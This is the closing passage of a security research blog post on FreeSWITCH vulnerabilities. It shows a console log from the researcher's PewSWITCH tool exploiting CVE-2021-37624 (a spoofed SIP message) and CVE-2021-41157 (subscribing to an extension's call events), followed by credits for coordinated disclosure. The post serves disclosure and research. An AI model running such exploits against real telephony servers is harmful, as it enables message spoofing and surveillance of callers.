</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Heuristics indicate that the server is FreeSWITCH.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Using output directory ./pewswitch-results/ under /home/infected/Projects/pewswitch...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Starting scan at<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16.436642136</span> <span style="color:#ae81ff">+0530</span> IST m=<span style="color:#ae81ff">+0.003288205</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Sent <span style="color:#e6db74">&#34;FBI here. Open your door!&#34;</span> to <span style="color:#ae81ff">1005</span>@192.168.0.<span style="color:#ae81ff">107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5060</span>!
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Exploit completed <span style="color:#66d9ef">for</span> CVE-<span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">37624</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1005</span>@192.168.0.<span style="color:#ae81ff">107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5060</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Trying to subscribe extension <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">60</span> seconds...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> talk
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> hold
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> conference
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> as-feature-event
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> dialog
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> line-seize
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> call-info
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> sla
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> include-session-description
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> presence
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> presence.winfo
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> message-summary
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Subscribing to extension <span style="color:#ae81ff">1005</span> <span style="color:#66d9ef">for</span> event<span style="color:#960050;background-color:#1e0010">:</span> refer
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Starting to listen <span style="color:#66d9ef">for</span> NOTIFY messages <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">60</span> seconds...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">47</span> Notifications received <span style="color:#66d9ef">for</span> extension <span style="color:#ae81ff">1005</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">39</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Exploit completed <span style="color:#66d9ef">for</span> CVE-<span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">41157</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1005</span>@192.168.0.<span style="color:#ae81ff">107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5060</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Writing results to destination directory as JSON...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Scan finished at<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16.475353572</span> <span style="color:#ae81ff">+0530</span> IST m=<span style="color:#ae81ff">+60.041999624</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Total <span style="color:#ae81ff">1</span> hosts scanned <span style="color:#66d9ef">in</span> 1m0.038729564s.
</span></span></code></pre></div><p>This creates a <code>./pewswitch-results/</code> directory and puts a JSON report of the scan under it. You can find a sample of the report <a href="https://github.com/0xInfection/PewSWITCH/blob/v0.1/pewswitch-results/sample-report.json">here</a>.</p>
<p>There are several other command lines flags available with the tool itself which allows packet customization and other features. Feel free to explore them!</p>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>Credits go out to the team at Enable Security who coordinated the disclosures and came up with excellent advisories which can be found on <a href="https://github.com/signalwire/freeswitch/security/advisories">FreeSWITCH&rsquo;s GitHub</a>. Apart from that, I&rsquo;d like to personally thank Sandro for allowing me to do this research under him and his incredible support and guidance throughout the process. From knowing nothing about telephony to finding bugs in popular RTC implementations, it had been an amazing journey. :)</p>
<p>This brings us to the end of the blog. Cheers! 🥂</p>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
      

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        1873 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2021-10-31 00:00
        

         
          
        
      </p>
    </div>

    
    <div class="pagination">
        

        <div class="pagination__buttons">
            
            <span class="button previous">
                <a href="https://0xinfection.xyz/posts/breaking-the-waf-wall-modsecurity-crs/">
                    <span class="button__icon">←</span>
                    <span class="button__text">Breaking the WAF Wall: ModSecurity CRS</span>
                </a>
            </span>
            

            
            <span class="button next">
                <a href="https://0xinfection.xyz/posts/offensive-wmi-active-directory-enumeration-part-5/">
                    <span class="button__text">Offensive WMI - Active Directory Enumeration (Part 5)</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


    

    

    

  </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2025</span>
            
            <span>0xInfection</span>
            
            
        </div>
    </div>
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://0xinfection.xyz/bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>




    </body>
</html>
